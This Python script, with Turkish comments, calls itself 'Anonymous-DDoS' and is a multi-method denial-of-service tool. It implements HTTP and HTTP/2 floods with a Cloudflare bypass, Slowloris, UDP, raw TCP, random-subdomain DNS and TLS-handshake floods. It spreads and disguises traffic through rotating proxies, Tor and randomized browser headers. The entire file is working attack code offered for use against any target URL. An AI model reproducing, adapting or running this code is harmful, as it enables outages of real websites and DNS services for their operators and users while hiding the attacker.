import threading
import requests
import random
import time
import argparse
import socket
import cloudscraper
import ssl
import socks
import httpx
from urllib.parse import urlparse, urljoin

# --- User-Agent ve Dinamik Referer Listeleri ---
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/126.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", # Eski Chrome
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", # Eski Chrome
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", # Eski Chrome
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0", # Eski Firefox
    "Mozilla/5.0 (Android 10; Mobile; rv:80.0) Gecko/80.0 Firefox/80.0", # Eski mobil Firefox
]

common_referers = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://www.yahoo.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://www.facebook.com/",
    "https://t.co/", # Twitter kısaltması
    "https://www.youtube.com/",
    "https://www.reddit.com/",
]

def create_dynamic_referer(target_url):
    parsed_target = urlparse(target_url)
    if random.random() < 0.7:
        referer_base = random.choice(common_referers)
        if "?" in referer_base:
            keywords = ["buy", "best", "price", "review", "news", "site"]
            return referer_base + random.choice(keywords) + "+" + parsed_target.hostname.split('.')[0]
        return referer_base
    else:
        random_path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 15)))
        return urljoin(parsed_target.scheme + "://" + parsed_target.netloc, random_path)

# --- Proxy Yönetimi Sınıfı ---
class ProxyManager:
    def __init__(self, proxy_file, retry_time=300):
        self.all_proxies = self._load_proxies(proxy_file)
        self.available_proxies = list(self.all_proxies)
        self.bad_proxies = {}
        self.lock = threading.Lock()
        self.retry_time = retry_time
        if not self.all_proxies:
            print("[!] Proxy dosyası boş veya okunamadı. Proxy desteği kullanılamayacak.")

    def _load_proxies(self, file):
        try:
            with open(file, "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
                print(f"[✓] {len(proxies)} proxy yüklendi.")
                return proxies
        except Exception as e:
            print(f"[!] Proxy dosyası okunamadı: {e}")
            return []

    def get_proxy(self):
        with self.lock:
            current_time = time.time()
            to_remove_from_bad = []
            for proxy, bad_time in self.bad_proxies.items():
                if current_time - bad_time > self.retry_time:
                    self.available_proxies.append(proxy)
                    to_remove_from_bad.append(proxy)
            for proxy in to_remove_from_bad:
                del self.bad_proxies[proxy]

            if not self.available_proxies:
                return None
            
            proxy = random.choice(self.available_proxies)
            return proxy

    def mark_bad(self, proxy):
        with self.lock:
            if proxy in self.available_proxies:
                self.available_proxies.remove(proxy)
            self.bad_proxies[proxy] = time.time()

# --- URL ve Port Yardımcı Fonksiyonları ---
def fix_url(url):
    parsed = urlparse(url)
    if not parsed.scheme:
        url = "https://" + url
        print(f"[i] URL'e otomatik https:// eklendi → {url}")
    return url

# --- Saldırı Metotları ---

# HTTP Flood (Normal veya Cloudflare Bypass)
def send_request(url, proxy_manager=None, use_tor=False, bypass_type=None, thread_id=None):
    proxy_info = None
    selected_proxy = None

    if use_tor:
        proxy_info = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
    elif proxy_manager:
        selected_proxy = proxy_manager.get_proxy()
        if selected_proxy:
            proxy_info = {"http": f"http://{selected_proxy}", "https": f"http://{selected_proxy}"}

    headers = {
        "User-Agent": random.choice(user_agents),
        "Referer": create_dynamic_referer(url),
        "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*", "text/html,application/xhtml+xml,application/xml;q=0.9", "*/*"]),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "identity"]),
        "Accept-Language": random.choice(["en-US,en;q=0.9,tr;q=0.8", "en-US,en;q=0.5", "en-GB,en;q=0.9", "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"]),
        "Connection": "keep-alive",
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "Pragma": random.choice(["no-cache", ""]),
    }

    try:
        session = requests.Session()
        if bypass_type == "cloudflare":
            session = cloudscraper.create_scraper() 
        
        response = session.get(url, headers=headers, proxies=proxy_info, timeout=5)
        
        # Sadece hata durumlarında veya belirli statü kodlarında bilgi ver
        if response.status_code != 200:
            print(f"[⚠️] HTTP → Yanıt Kodu: {response.status_code} [Thread-{thread_id}]")

    except requests.exceptions.Timeout:
        print(f"[X] HTTP → Zaman Aşımı [Thread-{thread_id}]")
        if selected_proxy and proxy_manager:
            proxy_manager.mark_bad(selected_proxy)
    except requests.exceptions.ConnectionError:
        print(f"[X] HTTP → Bağlantı Hatası [Thread-{thread_id}]")
        if selected_proxy and proxy_manager:
            proxy_manager.mark_bad(selected_proxy)
    except requests.exceptions.RequestException as e:
        print(f"[X] HTTP → Hata: {e} [Thread-{thread_id}]")
        if selected_proxy and proxy_manager:
            proxy_manager.mark_bad(selected_proxy)
    except Exception as e:
        print(f"[X] HTTP → Genel Hata: {e} [Thread-{thread_id}]")
        if selected_proxy and proxy_manager:
            proxy_manager.mark_bad(selected_proxy)

# HTTP/2 Flood (Senkron HTTpx Client ile)
def send_http2_request(url, proxy_manager=None, use_tor=False, thread_id=None):
    proxy_config = None
    selected_proxy = None

    if use_tor:
        proxy_config = "socks5://127.0.0.1:9050" 
    elif proxy_manager:
        selected_proxy = proxy_manager.get_proxy()
        if selected_proxy:
            proxy_config = f"http://{selected_proxy}"

    headers = {
        "User-Agent": random.choice(user_agents),
        "Referer": create_dynamic_referer(url),
        "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*", "text/html,application/xhtml+xml,application/xml;q=0.9", "*/*"]),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "identity"]),
        "Accept-Language": random.choice(["en-US,en;q=0.9,tr;q=0.8", "en-US,en;q=0.5", "en-GB,en;q=0.9", "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"]),
        "Connection": "keep-alive",
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "Pragma": random.choice(["no-cache", ""]),
    }

    try:
        if proxy_config:
            with httpx.Client(http2=True, proxies=proxy_config, timeout=5) as client:
                response = client.get(url, headers=headers)
        else:
            with httpx.Client(http2=True, timeout=5) as client:
                response = client.get(url, headers=headers)
            
        if response.status_code != 200:
            print(f"[⚠️] HTTP/2 → Yanıt Kodu: {response.status_code} [Thread-{thread_id}]")

    except httpx.TimeoutException:
        print(f"[X] HTTP/2 → Zaman Aşımı [Thread-{thread_id}]")
        if selected_proxy and proxy_manager:
            proxy_manager.mark_bad(selected_proxy)
    except httpx.ConnectError:
        print(f"[X] HTTP/2 → Bağlantı Hatası [Thread-{thread_id}]")
        if selected_proxy and proxy_manager:
            proxy_manager.mark_bad(selected_proxy)
    except httpx.RequestError as e:
        print(f"[X] HTTP/2 → Hata: {e} [Thread-{thread_id}]")
        if selected_proxy and proxy_manager:
            proxy_manager.mark_bad(selected_proxy)
    except Exception as e:
        print(f"[X] HTTP/2 → Genel Hata: {e} [Thread-{thread_id}]")
        if selected_proxy and proxy_manager:
            proxy_manager.mark_bad(selected_proxy)


# Yeni TCP/HTTP Flood Fonksiyonu (Hammer benzeri)
def send_tcp_http_flood(host, port, duration, thread_id, proxy_manager=None, use_tor=False):
    end_time = time.time() + duration if duration else None
    
    request_data_template = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {random.choice(user_agents)}\r\n"
        f"Accept-Language: en-US,en;q=0.5\r\n"
        f"Cache-Control: no-cache\r\n"
        f"\r\n"
    ).encode('utf-8')

    while True:
        if end_time and time.time() > end_time:
            break
        
        s = None
        selected_proxy = None
        
        try:
            # Proxy veya Tor ile bağlantı kurma (Socks kütüphanesi ile)
            if use_tor:
                s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            elif proxy_manager:
                selected_proxy = proxy_manager.get_proxy()
                if selected_proxy:
                    proxy_ip, proxy_port = selected_proxy.split(':')
                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.settimeout(2) # Kısa zaman aşımı
            s.connect((host, port)) # TCP bağlantısını kur
            
            s.sendall(request_data_template) # HTTP GET isteğini gönder

            try:
                s.shutdown(socket.SHUT_WR) 
            except OSError:
                pass # Bağlantı zaten kapanmışsa hata vermemesi için

        except socket.timeout:
            print(f"[X] TCP/HTTP → Zaman Aşımı: Hedef yanıt vermiyor olabilir! [Thread-{thread_id}]")
            if selected_proxy and proxy_manager:
                proxy_manager.mark_bad(selected_proxy)
        except socket.error as e:
            if "Connection refused" in str(e) or "Connection reset by peer" in str(e):
                print(f"[X] TCP/HTTP → Bağlantı Reddedildi/Sıfırlandı: Sunucu çökmüş olabilir! [Thread-{thread_id}]")
            else:
                print(f"[X] TCP/HTTP → Bağlantı Hatası: {e} - Sunucu yanıt vermiyor olabilir! [Thread-{thread_id}]")
            if selected_proxy and proxy_manager:
                proxy_manager.mark_bad(selected_proxy)
        except socks.ProxyError as e:
            print(f"[X] TCP/HTTP → Proxy Hatası: {e} - Proxy çalışmıyor olabilir! [Thread-{thread_id}]")
            if selected_proxy and proxy_manager:
                proxy_manager.mark_bad(selected_proxy)
        except Exception as e:
            print(f"[X] TCP/HTTP → Genel Hata: {e} - Sunucu yanıt vermiyor olabilir! [Thread-{thread_id}]")
            if selected_proxy and proxy_manager:
                proxy_manager.mark_bad(selected_proxy)
        finally:
            if s:
                s.close() # Bağlantıyı kapat

# Slowloris
def slowloris_attack(host, port, duration, thread_id):
    try:
        sockets = []
        end_time = time.time() + duration if duration else None
        # Bağlantı başına 100 soket açma girişimi
        for _ in range(100): 
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode())
                s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                sockets.append(s)
            except socket.error:
                print(f"[X] Slowloris → Bağlantı kurulamadı, durduruluyor. [Thread-{thread_id}]")
                break 
        
        if not sockets:
            print(f"[X] Slowloris → Hiçbir bağlantı açılamadı [Thread-{thread_id}]")
            return

        print(f"[Thread-{thread_id}] Slowloris {len(sockets)} bağlantı açtı.")
        while True:
            if end_time and time.time() > end_time:
                break
            for s in list(sockets):
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                except socket.error:
                    print(f"[X] Slowloris → Bağlantı kapandı, yeniden deneniyor... [Thread-{thread_id}]")
                    sockets.remove(s) # Hata veren soketi listeden çıkar
                    try: # Yeni bir soket açma girişimi
                        s_new = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s_new.settimeout(4)
                        s_new.connect((host, port))
                        s_new.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
                        s_new.send(f"Host: {host}\r\n".encode())
                        s_new.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode())
                        s_new.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                        sockets.append(s_new)
                        print(f"[✓] Slowloris → Bağlantı yenilendi! [Thread-{thread_id}]")
                    except socket.error:
                        pass # Yeniden deneme başarısız oldu
            
            if not sockets:
                print(f"[X] Slowloris → Tüm bağlantılar kapandı [Thread-{thread_id}]")
                break

            time.sleep(10) # Slowloris için gerekli bekleme süresi
    except KeyboardInterrupt:
        print(f"[i] Slowloris → Saldırı durduruldu [Thread-{thread_id}]")
    except Exception as e:
        print(f"[X] Slowloris → Genel Hata: {e} [Thread-{thread_id}]")

# UDP flood
def udp_flood(host, port, duration, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_payload = random._urandom(1024)
    end_time = time.time() + duration if duration else None
    while True:
        if end_time and time.time() > end_time:
            break
        try:
            sock.sendto(bytes_payload, (host, port))
        except socket.error as e:
            print(f"[X] UDP → Gönderim hatası: {e} - Hedef yanıt vermiyor olabilir! [Thread-{thread_id}]")
        except Exception as e:
            print(f"[X] UDP → Genel Hata: {e} - Hedef yanıt vermiyor olabilir! [Thread-{thread_id}]")

# DNS Flood
def dns_flood(target_domain, dns_server, duration, thread_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration if duration else None

    def create_dns_query(domain):
        tid = random.getrandbits(16)
        flags = 0x0100 # Standard query
        qdcount = 1
        header = tid.to_bytes(2, 'big') + flags.to_bytes(2, 'big') + \
                 qdcount.to_bytes(2, 'big') + b'\x00\x00\x00\x00\x00\x00'

        qname = b''
        for part in domain.split('.'):
            qname += len(part).to_bytes(1, 'big') + part.encode('utf-8')
        qname += b'\x00' # Null terminator for the domain name
        
        qtype = 1 # A record
        qclass = 1 # IN (Internet)
        
        question = qname + qtype.to_bytes(2, 'big') + qclass.to_bytes(2, 'big')
                   
        return header + question

    while True:
        if end_time and time.time() > end_time:
            break
        try:
            random_subdomain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5,15)))
            full_domain = f"{random_subdomain}.{target_domain}"
            dns_query_packet = create_dns_query(full_domain)
            
            sock.sendto(dns_query_packet, (dns_server, 53))
        except socket.error as e:
            print(f"[X] DNS → Gönderim hatası: {e} - DNS sunucusu yanıt vermiyor olabilir! [Thread-{thread_id}]")
        except Exception as e:
            print(f"[X] DNS → Genel Hata: {e} - DNS sunucusu yanıt vermiyor olabilir! [Thread-{thread_id}]")

# TLS Handshake Flood
def tls_handshake_flood(host, port, duration, thread_id, proxy_manager=None, use_tor=False):
    end_time = time.time() + duration if duration else None
    context = ssl.create_default_context()
    
    while True:
        if end_time and time.time() > end_time:
            break
        
        sock = None
        selected_proxy = None

        try:
            if use_tor:
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            elif proxy_manager:
                selected_proxy = proxy_manager.get_proxy()
                if selected_proxy:
                    proxy_ip, proxy_port = selected_proxy.split(':')
                    sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            sock.settimeout(5)
            sock.connect((host, port))

            wrapped_socket = context.wrap_socket(sock, server_hostname=host)
            wrapped_socket.do_handshake()
            
            wrapped_socket.close() 

        except socks.ProxyError as e:
            if use_tor:
                print(f"[X] TLS Handshake → Tor Proxy Hatası: {e} [Thread-{thread_id}]")
            elif selected_proxy and proxy_manager:
                print(f"[X] TLS Handshake → HTTP Proxy Hatası: {e} [Thread-{thread_id}]")
                proxy_manager.mark_bad(selected_proxy)
            else:
                 print(f"[X] TLS Handshake → Proxy Hatası (Tanımsız): {e} [Thread-{thread_id}]")
        except socket.timeout:
            print(f"[X] TLS Handshake → Zaman Aşımı: Hedef yanıt vermiyor olabilir! [Thread-{thread_id}]")
            if selected_proxy and proxy_manager:
                proxy_manager.mark_bad(selected_proxy)
        except (ssl.SSLError, socket.error) as e:
            if "Connection refused" in str(e) or "Connection reset by peer" in str(e):
                print(f"[X] TLS Handshake → Bağlantı Reddedildi/Sıfırlandı: Sunucu çökmüş olabilir! [Thread-{thread_id}]")
            elif "timed out" in str(e):
                 print(f"[X] TLS Handshake → SSL Zaman Aşımı: {e} - Hedef yanıt vermiyor olabilir! [Thread-{thread_id}]")
            else:
                print(f"[X] TLS Handshake → Hata: {e} - Hedef yanıt vermiyor olabilir! [Thread-{thread_id}]")
            if selected_proxy and proxy_manager:
                proxy_manager.mark_bad(selected_proxy)
        except Exception as e:
            print(f"[X] TLS Handshake → Genel Hata: {e} - Hedef yanıt vermiyor olabilir! [Thread-{thread_id}]")
            if selected_proxy and proxy_manager:
                proxy_manager.mark_bad(selected_proxy)
        finally:
            if sock:
                sock.close()


# Ana saldırı yöneticisi
def start_attack(url, threads, duration=None, proxy_file=None, tor=False, method="http", bypass_type=None, dns_server=None):
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port 
    if port is None:
        if parsed.scheme == "https":
            port = 443
        elif parsed.scheme == "http":
            port = 80
        elif method == "dns": 
            port = 53
        else: 
            port = 80 


    if method == "dns" and not dns_server:
        print("[!] DNS flood için --dns-server parametresi belirtilmelidir. Çıkılıyor.")
        return
    
    if method == "tcp" and parsed.scheme not in ["http", "https"]:
        print(f"[!] TCP flood (HTTP/S tabanlı) için URL HTTP veya HTTPS ile başlamalıdır. URL'yi {url.replace('://', 's://', 1) if '://' in url else 'https://' + url} olarak deneyin. Çıkılıyor.")
        return
    
    if (method == "tls-handshake" or method == "http2") and parsed.scheme != "https":
        print(f"[!] {method.upper()} flood sadece HTTPS hedefler için geçerlidir. URL'yi https:// ile başlatın. Çıkılıyor.")
        return 

    proxy_manager = None
    if proxy_file:
        proxy_manager = ProxyManager(proxy_file)
        if not proxy_manager.all_proxies:
            proxy_manager = None 

    time_start = time.time()

    def attack(thread_id):
        while True:
            if duration and time.time() > time_start + duration:
                break

            if method == "http":
                send_request(url, proxy_manager, tor, bypass_type, thread_id)
            elif method == "http2":
                send_http2_request(url, proxy_manager, tor, thread_id) 
            elif method == "slowloris":
                slowloris_attack(host, port, duration, thread_id)
                break 
            elif method == "udp":
                udp_flood(host, port, duration, thread_id)
            elif method == "tcp": 
                send_tcp_http_flood(host, port, duration, thread_id, proxy_manager, tor)
            elif method == "dns":
                dns_flood(host, dns_server, duration, thread_id)
            elif method == "tls-handshake":
                tls_handshake_flood(host, port, duration, thread_id, proxy_manager, tor) 

    print(f"[🚀] Saldırı başlatılıyor: {method.upper()}")
    print(f"[🌐] Hedef: {url} (Host: {host}, Port: {port})") 
    print(f"[🧵] Thread: {threads}")
    print(f"[⏱️] Süre: {'Sınırsız' if not duration else str(duration)+'s'}")
    if proxy_manager: print(f"[🕵️] Proxy aktif (sağlık kontrolü ile)")
    elif proxy_file: print(f"[🕵️] Proxy aktif (proxy dosyası boş/hatalı)")
    if tor: print(f"[🧅] Tor aktif (127.0.0.1:9050)")
    if bypass_type: print(f"[🛡️] Bypass tipi aktif: {bypass_type}")
    if method == "dns" and dns_server: print(f"[⚙️] DNS Sunucusu: {dns_server}")
    print("\n--- Çıktılar ↓ ---\n") # Çıktıların başlayacağını belirten bir ayraç
    print("[i] Sunucu yanıt vermediğinde veya bağlantı hatası oluştuğunda uyarılar görünecektir.")

    for i in range(threads):
        threading.Thread(target=attack, args=(i+1,)).start()

# Ana fonksiyon
def main():
    parser = argparse.ArgumentParser(description="🔥 Anonymous-DDoS | Gelişmiş Termux Uyumlu DDoS Aracı")
    parser.add_argument("--url", required=True, help="Hedef URL (örn: https://example.com) veya DNS flood için hedef domain (örn: example.com)")
    parser.add_argument("--threads", type=int, default=200, help="Thread sayısı (varsayılan: 200 - Hammer'ın varsayılanından daha yüksek)")
    parser.add_argument("--time", type=int, help="Süre (saniye) - boşsa sınırsız)")
    parser.add_argument("--proxy", help="Proxy listesi dosyasının yolu (örn: proxies.txt)")
    parser.add_argument("--tor", action="store_true", help="Tor ağı üzerinden istek gönder (127.0.0.1:9050)")
    parser.add_argument("--method", choices=["http", "http2", "slowloris", "udp", "tcp", "dns", "tls-handshake"], default="http", help="Saldırı yöntemi (varsayılan: http). 'tcp' artık Hammer benzeri HTTP flood yapar.")
    parser.add_argument("--bypass", choices=["cloudflare"], help="WAF/Bot koruma bypass seçeneği (örn: cloudflare)")
    parser.add_argument("--dns-server", help="DNS flood için hedef DNS sunucusunun IP adresi (örn: 8.8.8.8)")

    args = parser.parse_args()
    url = fix_url(args.url)
    
    start_attack(url, args.threads, args.time, args.proxy, args.tor, args.method, args.bypass, args.dns_server)

if __name__ == "__main__":
    main()
